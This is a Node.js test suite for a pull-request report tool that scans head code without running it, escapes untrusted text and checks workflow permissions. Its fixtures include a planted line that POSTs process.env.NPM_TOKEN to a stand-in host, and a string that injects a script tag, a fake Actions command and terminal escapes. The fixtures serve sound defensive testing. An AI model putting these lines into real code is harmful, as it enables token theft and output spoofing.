"use strict";
const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const { spawnSync } = require("node:child_process");
const { buildReport, render, readConfig, summarize, changes, snapshot, LIMITS } = require("../scripts/compose-pr-report");
const repo = path.resolve(__dirname, "..");
const baseSha = "a".repeat(40), headSha = "b".repeat(40);

function fixture(t) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "compose-pr-test-"));
  t.after(() => fs.rmSync(root, { recursive: true, force: true }));
  const base = path.join(root, "base"), head = path.join(root, "head");
  const put = (directory, name, value) => {
    const file = path.join(directory, name); fs.mkdirSync(path.dirname(file), { recursive: true });
    fs.writeFileSync(file, typeof value === "string" ? value : JSON.stringify(value));
  };
  for (const directory of [base, head]) {
    put(directory, "package.json", { name: "fixture", version: "1.0.0", scripts: { postinstall: "exit 99" } });
    put(directory, "index.js", "module.exports = 'public';");
    put(directory, ".github/compose-report.json", { schemaVersion: 1, targets: [{ root: ".", entry: "index.js", allowRootOnly: true }] });
  }
  return { root, base, head, put, options: { base, head, baseSha, headSha } };
}

test("root-only PR comparison identifies new dataflow without executing head code or its config", async t => {
  const f = fixture(t), marker = path.join(f.root, "executed");
  f.put(f.head, ".github/compose-report.json", { schemaVersion: 1, targets: [{ root: "../outside", entry: "ignore.js", allowRootOnly: true }] });
  f.put(f.head, "index.js", `require('fs').writeFileSync(${JSON.stringify(marker)}, 'executed');\nfetch('https://example.invalid/collect', {method:'POST',body:process.env.NPM_TOKEN});`);
  const report = await buildReport(f.options);
  assert.equal(fs.existsSync(marker), false);
  assert.equal(report.authorization.installAllowed, false);
  assert.equal(report.targets.length, 1);
  const result = report.targets[0];
  assert.equal(result.head.rootOnly, true);
  assert.ok(result.head.gaps.some(g => g.code === "root-only-source"));
  assert.equal(result.flows.added.length, 1);
  assert.match(result.flows.added[0].destination, /example\.invalid/);
  assert.ok(result.flows.added[0].trace.some(s => s.kind === "source"));
  assert.ok(result.head.findings.length > 0);
  assert.equal(result.head.installAllowed, false);
  assert.equal(fs.existsSync(path.join(f.head, "package-lock.json")), false, "input tree was not mutated");
});

test("real committed lock snapshots show cross-package flow changes and preserve missing-source gaps", async t => {
  const { createScenario } = await import("../components/compose/examples/support/scenario.mjs");
  const base = createScenario("public"), head = createScenario("sensitive");
  t.after(() => { base.cleanup(); head.cleanup(); });
  base.put(".github/compose-report.json", { schemaVersion: 1, targets: [{ root: ".", entry: "index.js", allowRootOnly: false }] });
  const options = { base: base.root, head: head.root, baseSha, headSha };
  const report = await buildReport(options);
  assert.equal(report.targets[0].head.rootOnly, false);
  assert.ok(report.targets[0].flows.added.some(f => f.crossPackage));
  fs.rmSync(path.join(head.root, "node_modules/demo-reader"), { recursive: true });
  const incomplete = await buildReport(options);
  assert.equal(incomplete.targets[0].head.execution, "partial");
  assert.ok(incomplete.targets[0].head.gaps.some(g => ["missing-source", "missing-package"].includes(g.code)));
  assert.equal(incomplete.targets[0].head.installAllowed, false);
});

test("line shifts do not invent new flow signatures and disappearance never claims a fix", () => {
  const flow = line => ({ crossPackage: true, destination: "https://example.invalid", trace: [{ kind: "source", label: "env", package: { id: "." }, file: "index.js", line }] });
  const report = findings => ({ decision: "review", execution: "completed", compose: { findings }, gaps: [] });
  const before = summarize(report([flow(1), flow(1)]), {}), after = summarize(report([flow(4)]), {});
  assert.deepEqual(changes(before, after, "flows"), { added: [], absenceStatus: "compared", absenceReason: null, noLongerObserved: [] });
  assert.equal(changes(after, before, "flows").added.length, 0);
  const gone = summarize(report([]), {});
  assert.equal(changes(before, gone, "flows").noLongerObserved.length, 1);
});

test("source text cannot inject HTML, Markdown links, Actions commands or terminal controls", () => {
  const attack = '</code><script>alert(1)</script>\n::warning::fake\u001b[2J\u202e [x](https://evil.invalid)';
  const state = summarize({ decision: "block", execution: "partial", compose: { findings: [{ destination: attack, trace: [{ kind: "source", label: attack, file: attack }] }] },
    pkgxray: { packages: [{ id: attack, report: { findings: [{ severity: "high", category: attack, file: attack, rationale: attack }] } }] },
    gaps: [{ code: attack, file: attack, message: attack }] }, {});
  const empty = summarize({}, {});
  const report = { baseSha, headSha, targets: [{ target: { root: ".", entry: "index.js" }, base: empty, head: state,
    flows: changes(empty, state, "flows"), findings: changes(empty, state, "findings") }] };
  const markdown = render(report);
  assert.doesNotMatch(markdown, /<script>|\n::warning::|\u001b|\u202e/);
  assert.match(markdown, /&#60;script&#62;/);
  assert.match(markdown, /&#92;u001b/);
  assert.doesNotMatch(markdown, /\[x\]\(https:\/\/evil/);
  assert.match(markdown, /No-longer-observed evidence does not prove a risk was fixed/);
  assert.equal(state.decision, "block");
});

test("failed, partial or truncated evidence never claims findings disappeared", () => {
  const completed = { decision: "review", execution: "completed", compose: { findings: [{ destination: "https://example.invalid", trace: [] }] },
    pkgxray: { packages: [{ id: ".", report: { findings: [{ severity: "high", category: "exec", file: "index.js", rationale: "Execution", snippet: "exec('old-command')" }] } }] } };
  const before = summarize(completed, {});
  for (const after of [summarize({ execution: "partial", gaps: [{ code: "worker-failed" }] }, {}),
    { ...summarize({ execution: "completed" }, {}), evidenceTruncated: true },
    summarize({ execution: "completed", gaps: [{ code: "missing-source" }] }, {})]) {
    for (const key of ["flows", "findings"]) {
      const delta = changes(before, after, key);
      assert.equal(delta.absenceStatus, "unavailable");
      assert.equal(delta.noLongerObserved, null);
      assert.match(delta.absenceReason, /incomplete analysis or truncated evidence/);
      assert.equal(changes(after, before, key).noLongerObserved, null, "incomplete baseline also makes absence unavailable");
    }
  }
  const changed = structuredClone(completed);
  changed.pkgxray.packages[0].report.findings[0].snippet = "exec('new-risky-command')";
  const after = summarize(changed, {});
  assert.equal(changes(before, after, "findings").added.length, 1);
  assert.equal(changes(before, after, "findings").noLongerObserved.length, 1);
  assert.doesNotMatch(JSON.stringify(after), /new-risky-command/, "source snippets are fingerprinted but not published");
});

test("trusted config rejects traversal, excess targets, links, and caller-controlled scanner options", t => {
  const f = fixture(t);
  for (const target of [{ root: "..", entry: "index.js", allowRootOnly: true },
    { root: ".", entry: "../index.js", allowRootOnly: true }, { root: ".", entry: "index.js", allowRootOnly: true, scannerRoot: f.head }]) {
    f.put(f.base, ".github/compose-report.json", { schemaVersion: 1, targets: [target] });
    assert.throws(() => readConfig(f.base));
  }
  f.put(f.base, ".github/compose-report.json", { schemaVersion: 1, targets: Array(5).fill({ root: ".", entry: "index.js", allowRootOnly: true }) });
  assert.throws(() => readConfig(f.base));
});

test("snapshot never follows links or reads over-budget files, and reports omissions", t => {
  const f = fixture(t), target = path.join(f.root, "snapshot");
  f.put(f.base, "large.js", "x".repeat(LIMITS.fileBytes + 1));
  if (process.platform !== "win32") fs.symlinkSync(path.join(f.root, "outside"), path.join(f.base, "linked.js"));
  const result = snapshot(f.base, target, true);
  assert.equal(result.omitted, true);
  assert.equal(fs.existsSync(path.join(target, "large.js")), false);
  assert.equal(fs.existsSync(path.join(target, "linked.js")), false);
  assert.equal(result.rootOnly, true);
});

test("snapshot or worker failure produces incomplete REVIEW instead of a passing verdict", async t => {
  const f = fixture(t);
  const report = await buildReport(f.options, async () => { throw new Error("secret diagnostic\n::error::do not echo"); });
  assert.ok(report.targets.every(target => [target.base, target.head].every(state => state.decision === "review" && state.execution === "partial")));
  assert.doesNotMatch(JSON.stringify(report), /secret diagnostic|::error::/);
  assert.equal(report.authorization.installAllowed, false);
});

test("CLI emits advisory JSON and Markdown outside the source trees", t => {
  const f = fixture(t), output = path.join(f.root, "reports");
  const args = [path.join(repo, "scripts/compose-pr-report.js"), "--base", f.base, "--head", f.head,
    "--base-sha", baseSha, "--head-sha", headSha, "--output", output];
  const result = spawnSync(process.execPath, args, { cwd: f.root, encoding: "utf8", timeout: 15000 });
  assert.equal(result.status, 0, result.stderr);
  assert.equal(JSON.parse(fs.readFileSync(path.join(output, "report.json"))).authorization.installAllowed, false);
  assert.match(fs.readFileSync(path.join(output, "summary.md"), "utf8"), /Advisory only/);
  args[args.length - 1] = path.join(f.head, "output");
  const refused = spawnSync(process.execPath, args, { cwd: f.root, encoding: "utf8", timeout: 15000 });
  assert.equal(refused.status, 1);
  assert.equal(fs.existsSync(path.join(f.head, "output")), false);
});

test("workflow scans immutable head data using base-owned code with read-only credentials", () => {
  const workflow = fs.readFileSync(path.join(repo, ".github/workflows/compose-pr-report.yml"), "utf8");
  assert.match(workflow, /ref: \$\{\{ github\.event\.pull_request\.base\.sha \}\}/);
  assert.match(workflow, /ref: \$\{\{ github\.event\.pull_request\.head\.sha \}\}/);
  assert.match(workflow, /node trusted\/scripts\/compose-pr-report\.js/);
  assert.match(workflow, /contents: read/);
  assert.equal((workflow.match(/persist-credentials: false/g) || []).length, 2);
  assert.doesNotMatch(workflow, /^\s*pull_request_target:|^\s*run:.*(?:npm |proposed\/)|pull-requests: write/m);
  assert.match(workflow, /GITHUB_STEP_SUMMARY/);
});
